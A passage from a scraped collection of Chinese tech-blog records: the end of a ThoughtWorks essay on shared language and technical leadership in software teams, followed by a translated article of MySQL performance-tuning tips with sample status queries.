height=\"467\"></a></p>\n<p>软件工程里的核心观点是：一个问题被发现的越晚，修正的成本就越高。比代码更早的是沟通，比沟通更早的就是语言。我们用语言去描述沟通的错误，去描述代码中的错误，我们用什么来描述语言的错误呢？还是语言，这就使得整个工作困难重重，难以达成共识。所以我们更需要非常严肃的对待软件开发工作的第一现场。</p>\n<p>之前一些方法试图建立纯粹的统一语言，所有人都说一套语言，事实上这个方法已经被行业放弃了，我们要承认，各自不同的语言有些部分可以简单统一成一种表达以消除歧义，有些部分只能结合。也就是说相关人员要懂多门语言。这个现实是我们必须接受的，软件正在吞噬世界，语言只会越来越复杂。就像我们再努力消除污染，也不能幻想世界回到工业文明以前了。无论我们多么努力的去建立统一语言，也不可能形成一门简单的语言，只能是多门DSL的一个杂合体。</p>\n<p>不过由于历史的原因，在行业放弃的过程中，由于“反对预先设计”走的过了头，“不谈建模，不谈标准化”成了一种奇怪的政治正确，导致很多优秀的工具和方法被边缘化了。其实我们憎恨的只是预先设计造成的反馈速度变慢，只是在这个过程中连带上了憎恨预先设计时代的一些工具，这就有点上纲上线了。</p>\n<p>幸而最近几年，各种领域建模的设计方法又重新回归。最近大行其道的领域驱动设计，就是在很严肃的对待业务语言的设计和使用。而在前端领域，Design System试图解决前端开发和设计师之间的语言分歧问题。我个人在从事软件开发工程师的培养方面发现，很多传统的可视化工具，比如说UML。如果不以繁重的预先设计为目的，来使用这些工具，仅把它们用作提高沟通效率的工具，他们的威力是十分惊人的。</p>\n<p>以我本人的团队为例，我们使用ant design为基础，设计了design system。使得我们可以在三天之内得到一个可以点击的软件原型，并在此基础上，进行各利益相关方之间的需求交流和反馈。在交流的过程当中，我们也刻意的统一了语言，使得我们尽管是一个远程团队，但是在交流的时候，能够很清楚的知道我们在对信息架构在哪一层进行反馈。这不但使得业务方可以反馈技术方，其实技术方也在引导业务方。语言的影响是双向的。</p>\n<p>在技术领域里，我们也选择了隔离性更好的技术架构，使得MVP的代码不会变成我们演进道路上必须长期背负的负累。而之所以在一篇聊“语言”的文章里提技术架构，是因为我们认为真正的架构不是纸上的，也不是代码里的，而是每个团队成员心里的架构。实施一个架构必然也是要进行大量沟通，也需要统一语言。</p>\n<p>而在交流业务的时候，我们刻意的划分了各种不同的子领域，又在每个领域当中统一了名词。统一名词还是比较简单的，最难的是划分领域，我们为此投入了大量的工作，也犯了一些错误，但这些付出是值得的，这之后，我们的沟通变得非常流畅。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/communication.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/communication-1024x695.jpg\" alt=\"\" width=\"700\" height=\"475\"></a></p>\n<p>具体的实践有机会再跟大家分享。在这里仅仅聊一下沟通顺畅带来的价值，沟通顺畅的威力并不仅仅表现在沟通的时候可以很顺畅的传递信息，最重要的是当有团队成员对信息理解出现错误的时候，可以很容易的发现和给予反馈。</p>\n<p>这个优势在IT行业至关重要。IT行业的人员流动率接近25%，这意味着每年我们团队中至少有1/4的新人加入。即便我们想尽方法让我们的团队保持稳定，随着敏捷和精益创业的相关思想慢慢成为我们的工作常识，每个项目存在的时间都不会太长，这使得IT团队经常性的重组，有时是团队被打散，有时是同一个系统从一个团队交给了另一个团队。如果缺乏一种有效的反馈机制，那么无论是人员流动还是组织重组，所造成的切换成本都是一个很大的。尽管这个切换成本无法消除，但是尽量减少切换成本是我们每个专业人员应该追求的，尤其是团队中的技术领导者。</p>\n<p>技术领导者重音在“领导”，而不在“技术”。尤其在Tech@Core的今天，技术就是业务。优秀的技术领导者更不能把自己变成一个救火队员，只是被动的响应，尽管救火队员常常因为很容易被人看到而获得一些关注和赞扬，但在中国的文化里，我们都知道还有更高一层的境界，这个境界存在于很多典故中，比如上医治未病，善战者无赫赫之功。同理，软件开发领域的技术领导者们也应该努力使大多数问题发生的基础消灭于无形，这就需要我们走出舒适区，深入到软件开发的第一现场，进行现场管理。</p>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113385\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113385votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113385\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 78</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "MySQL 性能调优技巧", "fav_nums": 1, "url": "http://blog.jobbole.com/113197/", "create_date": "2017/12/06", "url_object_id": "9d1a4f483de8dad0a4da4300eacbcc09", "comment_nums": 2, "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://dzone.com/articles/mysql-performance-tuning-tips-for-the-shopping-sea\">Shree Nair</a>   译文出处：<a target=\"_blank\" href=\"http://www.iteye.com/news/32796\">ITeye/无阻我飞扬</a>   </div><blockquote><p><em>摘要：针对购物旺季网站流量会对数据库造成的压力，作者给出了MySQL性能调优的一些技巧，这些技巧极具参考价值，通过这些调优，可以有效避免因为流量过大造成服务器宕机，从而给企业造成经济损失。以下是译文</em></p></blockquote>\n<p>万圣节已经过去很久了，该是把注意力集中在即将到来的假日季节的时候了。首先是感恩节，接着就是黑色星期五和网络星期一，最终在圣诞节/节礼周（从12月26日的节礼日开始，到12月31日的除夕结束为期六天或更长时间。这个词是由零售业在2000年代中期左右发明的，试图延长他们的节礼日销售）达到购物高潮。对于企业主来说，一年的这个时候标志着人们期待已久的年底获利了结。对于一些DBA来说，它会带来恐惧，不安，甚至是不眠之夜，他们要努力使系统重新上线。</p>\n<p>值得庆幸是，情况并非如此。通过对MySQL性能变量做一些主动调整，可以使数据库服务器免受购物旺季带来的需求增加的冲击。</p>\n<h3>技巧#1：确定MySQL的最大连接数</h3>\n<p>对于MySQL的最大连接数，一次最好是发送5个请求到Web服务器。对Web服务器的5个请求中的一部分将用于CSS样式表，图像和脚本等资源。由于诸如浏览器缓存等原因，要获得准确的MySQL到Web服务器的请求比率可能很困难; 要想得到一个确切的数字，就需要分析Web服务器的日志文件。例如，可以手动访问Apache的“access_log”日志文件，也可以通过<a href=\"http://www.debianhelp.co.uk/analog.htm\" target=\"_blank\">Analog</a>或<a href=\"http://www.webalizer.org/\" target=\"_blank\">Webalizer</a>等实用程序访问日志文件。</p>\n<p>一旦有了对特定使用情况的准确估计，请将该比率乘以Web服务器的最大连接数。例如，如果Web服务器配置为最多为256个客户端提供服务，MySQL请求与Web请求的比率为1/8，则最好将最大数据库连接数设置为32。还要考虑留有安全余量，把这个数乘以2，得到最终的数量。只有在基础设施支持的情况下，才能尝试将数据库连接数的最大数量与Web服务器的客户端限制相匹配。在大多数情况下，最好保持接近32。</p>\n<p><strong>在Monyog中查看MySQL连接</strong></p>\n<p>在MySQL数据库中，MySQL的最大并发连接数是存储在全局变量max_connections中的。Monyog报告变量“max_connections”作为当前连接监控组中的“最大允许”指标。它还将该数字除以打开的连接数，以生成连接使用百分比：</p>\n<p>还有一个连接历史记录监控，可以帮助计算最佳的最大并发连接数。它包括尝试，拒绝和成功连接的数量。此外，允许达到的最大指标的百分比显示为一个进度条，可以让你快速评估服务器在过去达到的最大并发连接数：</p>\n<h3>技巧#2：为临时表分配足够的内存</h3>\n<p>在某些情况下，服务器在处理语句时会创建内部临时表。临时表用于内部操作如GROUP BY和distinct，还有一些ORDER BY查询以及UNION和FROM子句（派生表）中的子查询。这些都是在内存中创建的内存表。内存中临时表的最大大小由tmp_table_size和max_heap_table_size中较小的值确定。如果临时表的大小超过这个阈值，则将其转换为磁盘上的InnoDB或MyISAM表。此外，如果查询涉及BLOB或TEXT列，而这些列不能存储在内存表中，临时表总是直接指向磁盘。</p>\n<p>这种转换的代价很大，所以考虑增加max_heap_table_size和tmp_table_size变量的大小来帮助减少在磁盘上创建临时表的数量。请记住，这将需要大量内存，因为内存中临时表的大小是基于“最坏情况”的。例如，内存表总是使用固定长度的列，所以字符列使用VARCHAR（255）。这可以使内存中的临时表比想象的要大得多—事实上，这比查询表的总大小要大很多倍！当增加max_heap_table_size和tmp_table_sizevariables的大小时，一定要监视服务器的内存使用情况，因为内存中的临时表可能会增加达到服务器内存容量的风险。</p>\n<p>一般来说，32M到64M是建议值，从这两个变量开始并根据需要进行调优。</p>\n<p><strong>在Monyog中的临时表监测</strong></p>\n<p>临时表的监测是许多预定义的Monyog监测之一。它提供了一些临时表使用的指标，包括：</p>\n<ul>\n<li><strong>允许的最大值</strong>：显示tmp_table_size服务器变量的值，它定义了在内存中创建的临时表的最大大小。与max_heap_table_size一起，这个值定义了可以在内存中创建的临时表的最大大小。如果内存临时表大于此大小，则将其存储在磁盘上。</li>\n<li><strong>内存表的最大大小</strong>：显示max_heap_table_size服务器变量的值，该值定义了显式创建的MEMORY存储引擎表的最大大小。</li>\n<li><strong>创建的临时表总数</strong>：显示created_tmp_tables服务器变量的值，它定义了在内存中创建的临时表的数量。</li>\n<li><strong>在磁盘上创建的临时表</strong>：显示created_tmp_disk_tables服务器变量的值，该变量定义了在磁盘上创建的临时表的数量。如果这个值很高，则应该考虑增加tmp_table_size和max_heap_table_size的值，以便增加创建内存临时表的数量，从而减少在磁盘上创建临时表的数量。</li>\n<li><strong>磁盘：总比率</strong>：基于created_tmp_disk_tables除以created_tmp_tables的计算值。由于tmp_table_size或max_heap_table_size不足而在磁盘上创建的临时表的百分比。Monyog将这个数字显示为一个进度条和百分比，以便快速确定有多少磁盘用于临时表，而不是内存。</li>\n</ul>\n<p>趋势图可用于创建的总表，磁盘上创建的表和磁盘的总比值。这些让我们看到了它们随着时间的演变：</p>\n<h3>技巧#3：增加线程缓存大小</h3>\n<p>连接管理器线程处理服务器监听的网络接口上的客户端连接请求。连接管理器线程将每个客户端连接与专用于它的线程关联，该线程负责处理该连接的身份验证和所有请求处理。因此，线程和当前连接的客户端之间是一对一的比例。确保线程缓存足够大以容纳所有传入请求是非常重要的。</p>\n<p>MySQL提供了许多与连接线程相关的服务器变量：</p>\n<p>线程缓存大小由thread_cache_size系统变量决定。默认值为0（无缓存），这将导致为每个新连接设置一个线程，并在连接终止时需要处理该线程。如果希望服务器每秒接收数百个连接请求，那么应该将thread_cache_size设置的足够高，以便大多数新连接可以使用缓存线程。可以在服务器启动或运行时设置max_connections的值。</p>\n<p>还应该监视缓存中的线程数（Threads_cached）以及创建了多少个线程，因为无法从缓存中获取线程（Threads_created）。关于后者，如果Threads_created继续以每分钟多于几个线程的增加，请考虑增加thread_cache_size的值。</p>\n<p>使用MySQL show status命令显示MySQL的变量和状态信息。这里有几个例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3f9637cfb438582516\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSHOW GLOBAL STATUS LIKE '%Threads_connected%';\r\n\r\n+-------------------+-------+\r\n\r\n| Variable_name     | Value |\r\n\r\n+-------------------+-------+\r\n\r\n| Threads_connected | 2     |\r\n\r\n+-------------------+-------+\r\nSHOW GLOBAL STATUS LIKE '%Threads_running%';\r\n\r\n+-----------------+-------+\r\n\r\n| Variable_name   | Value |\r\n\r\n+-----------------+-------+\r\n\r\n| Threads_running | 1     |\r\n\r\n+-----------------+-------+\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3f9637cfb438582516-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3f9637cfb438582516-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-1\"><span class=\"crayon-e\">SHOW </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STATUS </span><span class=\"crayon-i\">LIKE</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'%Threads_connected%'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-3\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Variable_name</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-7\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-9\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Threads_connected</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-11\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-12\"><span class=\"crayon-e\">SHOW </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STATUS </span><span class=\"crayon-i\">LIKE</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'%Threads_running%'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-14\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-16\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Variable_name</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-18\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-20\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Threads_running</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3f9637cfb438582516-22\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3f9637cfb438582516-23\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p><strong>Monyog线程缓存监测</strong></p>\n<p>Monyog提供了一个监控线程缓存的屏幕，名为“线程”。与MySQL线程相关的服务器变量映射到以下Monyog指标：</p>\n<ul>\n<li>thread_cache_size：可以缓存的线程数。</li>\n<li>Threads_cached：缓存中的线程数。</li>\n<li>Threads_created：创建用于处理连接的线程。</li>\n</ul>\n<p>Monyog线程屏幕还包括“线程缓存命中率”指标。这是一个提示线程缓存命中率的指标。如果值较低，则应该考虑增加线程缓存。在状态栏以百分比形式显示该值；它的值越接近100％越好。</p>\n<p>如果这些指标的值等于或超过指定值，则可以将每一个指标配置为发出警告和/或严重警报。</p>\n<h3>其他相关的服务器变量</h3>\n<p>除了上述指标以外，还应该监控以下内容：</p>\n<ol>\n<li><strong>InnoDB缓冲池大小</strong>： InnoDB缓冲池大小在使用InnoDB的MySQL数据库中起着至关重要的作用。缓冲池同时缓存数据和索引。它的值应该尽可能的大，以确保数据库使用内存而不是硬盘驱动器进行读取操作。</li>\n<li><strong>临时表大小</strong>： MySQL使用max_heap_table_size和tmp_table_size中较小的一个来限制内存中临时表的大小。拥有较大的值可以帮助减少在磁盘上创建临时表的数量，但也会增加服务器内存容量的风险，因为这个指标适用于每个客户端。一般来说，32M到64M是建议的值，从这两个变量开始并根据需要进行调优。</li>\n<li><strong>InnoDB日志缓冲区大小</strong>： MySQL每次写入日志文件时，它都会利用可用于处理销售数据的重要系统资源。因此，将InnoDB日志缓冲区大小设置为较大值才有意义。这样，服务器在大型事务中写入磁盘的次数就减少了，从而最大限度地减少了这些耗时的操作。64M是这个变量的一个很好的起点。</li>\n</ol>\n<h3>结论</h3>\n<p>虽然即便是最大的公司网站也会因宕机而遭受损失，但这种影响对于处理网上销售的中小型企业尤其关键。根据<a href=\"https://blog.100tb.com/the-real-cost-of-downtime-for-business\" target=\"_blank\">最近的一份调查报告</a>显示，一分钟的宕机导致企业平均损失约5000美元。不要让你的业务成为那种统计数据（因为宕机造成的损失）的一部分。在假日繁忙之前，主动调优MySQL数据库服务器（S）并收获回报吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
